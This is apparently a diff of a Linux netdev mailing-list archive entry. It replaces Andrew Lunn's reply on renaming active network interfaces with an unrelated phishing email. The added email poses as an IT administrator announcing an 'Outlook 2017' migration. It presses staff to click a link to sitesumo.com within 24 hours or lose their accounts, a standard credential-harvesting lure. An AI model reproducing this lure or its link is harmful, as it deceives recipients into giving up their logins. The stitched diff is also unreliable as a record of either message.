@@ -1,39 +1,42 @@
-From: Andrew Lunn <andrew@lunn.ch>
-Subject: Re: [PATCH RFC net-next] net: Allow name change of IFF_UP interfaces
-Date: Wed, 9 Aug 2017 18:10:27 +0200
-Message-ID: <20170809161027.GA28694@lunn.ch>
-References: <20170809104202.30959-1-vkuznets@redhat.com>
- <CAPA1RqA0q3W-3PsqDpY8_xiBB18SCWTV1gT+BKOTqQfAA5D8Fg@mail.gmail.com>
- <87efskye74.fsf@vitty.brq.redhat.com>
+From: "Ozio, Noelle K (OZIONK15)" <OZIONK15@juniata.edu>
+Subject: RE:
+Date: Wed, 9 Aug 2017 16:12:05 +0000
+Message-ID: <CBDDD7D6C77EEE43BECE3A85947BE9DB0D6CAD88@Michael.juniata.edu>
+References: <CBDDD7D6C77EEE43BECE3A85947BE9DB0D6CA321@Michael.juniata.edu>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Cc: ???????????? <hideaki.yoshifuji@miraclelinux.com>,
-        network dev <netdev@vger.kernel.org>,
-        Linux Kernel Mailing List <linux-kernel@vger.kernel.org>,
-        "David S. Miller" <davem@davemloft.net>,
-        Eric Dumazet <edumazet@google.com>,
-        Stephen Hemminger <stephen@networkplumber.org>
-To: Vitaly Kuznetsov <vkuznets@redhat.com>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <87efskye74.fsf@vitty.brq.redhat.com>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+Content-Type: text/plain; charset="iso-8859-1"
+Content-Transfer-Encoding: 8BIT
+To: "Ozio, Noelle K (OZIONK15)" <OZIONK15@juniata.edu>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from mail-by2nam01hn0214.outbound.protection.outlook.com ([104.47.34.214]:45235
+        "EHLO NAM01-BY2-obe.outbound.protection.outlook.com"
+        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
+        id S1752642AbdHIQMN (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Wed, 9 Aug 2017 12:12:13 -0400
+In-Reply-To: <CBDDD7D6C77EEE43BECE3A85947BE9DB0D6CA321@Michael.juniata.edu>
+Content-Language: en-US
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-> I understand the 'legacy' concern but at the same time we don't want to
-> have aftificial limitations too. Name change, in particular, doesn't
-> happen 'under the hood' -- someone privileged enough needs to request
-> the change.
-> 
-> Can you think of any particular real world scenarios which are broken by
-> the change?
+________________________________
+From: Ozio, Noelle K (OZIONK15)
+Sent: Wednesday, August 09, 2017 11:51 AM
+To: Ozio, Noelle K (OZIONK15)
+Subject:
 
-How about:
+Dear Email User.
 
-man 8 dhclient-script
+We are migrating all staff email accounts into Staff Outlook 2017 office web mail and as such all active staff are to verify their mailbox, upgrade and migration to take effect now. This is done to improve the security and efficiency due to recent spam mails received.
 
-The interface name is passed in $interface to the scripts. Do we get
-the old name or the new name? I suspect scripts are going to break if
-they are given the old name, which no longer exists.
+Please all Staff Click HERE Switch to Outlook Webmail 2017 for Staff<http://sitesumo.com/Surveyor>
 
-     Andrew
+Note that, circulating this switching to Outlook is for all email service in this domain and if not done, we will start deactivating and deleting unverified and inactive email accounts without any further notice that did not migrate in the next 24 hours.
+KINDLY DO AS ADVISED ABOVE.
+
+Regards,
+External Email Administrator,
+Outlook Services for all Admin, Staff and Internet services
+Copyright 2017.
+
+
+CONFIDENTIALITY NOTICE: The materials in this electronic mail transmission (including all attachments) are private and confidential and are the property of the sender. The information contained in the material is privileged and is intended only for the use of the named addressee(s). If you are not the intended addressee, be advised that any unauthorized disclosure, copying, distribution or the taking of any action in reliance on the contents of this material is strictly prohibited. If you have received this e-mail in error, please immediately notify the sender by replying to the e-mail, and then destroy it immediately. Thank you.
